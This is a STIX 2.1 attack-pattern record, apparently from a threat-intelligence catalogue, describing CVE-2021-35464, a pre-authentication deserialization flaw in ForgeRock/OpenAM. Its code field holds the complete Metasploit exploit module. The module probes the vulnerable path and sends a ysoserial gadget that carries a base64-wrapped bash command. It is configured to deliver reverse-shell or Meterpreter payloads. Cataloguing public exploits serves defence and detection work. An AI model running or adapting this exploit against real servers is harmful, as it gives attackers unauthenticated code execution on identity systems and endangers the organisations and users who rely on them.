{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--03ddc3f5-fe6b-466c-860f-7f925ebadcf2",
    "created": "2024-08-14T17:11:06.886274Z",
    "modified": "2024-08-14T17:11:06.886279Z",
    "name": "ForgeRock / OpenAM Jato Java Deserialization",
    "description": " This module leverages a pre-authentication remote code execution vulnerability in the OpenAM identity and access management solution. The vulnerability arises from a Java deserialization flaw in OpenAM\u2019s implementation of the Jato framework and can be triggered by a simple one-line GET or POST request to a vulnerable endpoint. Successful exploitation yields code execution on the target system as the service user.  This vulnerability also affects the ForgeRock identity platform which is built on top of OpenAM and is thus is susceptible to the same issue. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/cve_2021_35464_forgerock_openam.rb",
            "external_id": "cve_2021_35464_forgerock_openam.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-35464"
        },
        {
            "source_name": "reference",
            "url": "https://portswigger.net/research/pre-auth-rce-in-forgerock-openam-cve-2021-35464"
        },
        {
            "source_name": "reference",
            "url": "https://backstage.forgerock.com/knowledge/kb/article/a47894244"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'ForgeRock / OpenAM Jato Java Deserialization',\n        'Description' => %q{\n          This module leverages a pre-authentication remote code execution vulnerability in the OpenAM identity and\n          access management solution. The vulnerability arises from a Java deserialization flaw in OpenAM\u2019s\n          implementation of the Jato framework and can be triggered by a simple one-line GET or POST request to a\n          vulnerable endpoint. Successful exploitation yields code execution on the target system as the service user.\n\n          This vulnerability also affects the ForgeRock identity platform which is built on top of OpenAM and is thus\n          is susceptible to the same issue.\n        },\n        'Author' => [\n          'Michael Stepankin',  # Original Discovery and PoC\n          'bwatters-r7',        # Msf module\n          'Spencer McIntyre',   # All of the Help\n          'jheysel-r7'          # Check Method\n        ],\n        'References' => [\n          ['CVE', '2021-35464'],\n          ['URL', 'https://portswigger.net/research/pre-auth-rce-in-forgerock-openam-cve-2021-35464'],\n          ['URL', 'https://backstage.forgerock.com/knowledge/kb/article/a47894244']\n        ],\n        'DisclosureDate' => '2021-06-29',\n        'License' => MSF_LICENSE,\n        'Platform' => ['unix', 'linux'],\n        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],\n        'Privileged' => false,\n        'Targets' => [\n          [\n            'Unix Command',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :unix_cmd,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/unix/reverse_python_ssl'\n              }\n            }\n          ],\n          [\n            'Linux Dropper',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :linux_dropper,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'\n              }\n            }\n          ]\n        ],\n        'DefaultTarget' => 1,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n    register_options([\n      Opt::RPORT(8080),\n      OptString.new('TARGETURI', [true, 'Base path', '/openam'])\n    ])\n  end\n\n  def check\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/oauth2/..;/ccversion/Version'),\n      'vars_post' => {\n        'jato.pageSession' => Base64.urlsafe_encode64(rand_text_alphanumeric(6..13))\n      }\n    )\n    if res.nil?\n      CheckCode::Unknown(\"The target server didn't respond!\")\n    elsif res.code == 302 && res.headers['Location']&.end_with?('/base/AMInvalidURL')\n      CheckCode::Appears\n    else\n      CheckCode::Safe\n    end\n  end\n\n  def execute_command(cmd, _opts = {})\n    cmd_encapsulated = \"bash -c {echo,#{Rex::Text.encode_base64(cmd)}}|{base64,-d}|bash\"\n    ysoserial_payload = Msf::Util::JavaDeserialization.ysoserial_payload('Click1', cmd_encapsulated, modified_type: 'none')\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/oauth2/..;/ccversion/Version'),\n      'vars_post' => {\n        'jato.pageSession' => Base64.urlsafe_encode64(\"\\x00\" + ysoserial_payload)\n      }\n    )\n    unless res && res.code == 302\n      fail_with(Failure::UnexpectedReply, \"Failed to execute command: #{cmd}\")\n    end\n    print_good(\"Successfully executed command: #{cmd}\")\n  end\n\n  def exploit\n    print_status(\"Executing #{target.name} for #{datastore['PAYLOAD']}\")\n    case target['Type']\n    when :unix_cmd\n      execute_command(payload.encoded)\n    when :linux_dropper\n      execute_cmdstager\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2021-06-29",
    "x_mitre_platforms": [
        "linux'"
    ]
}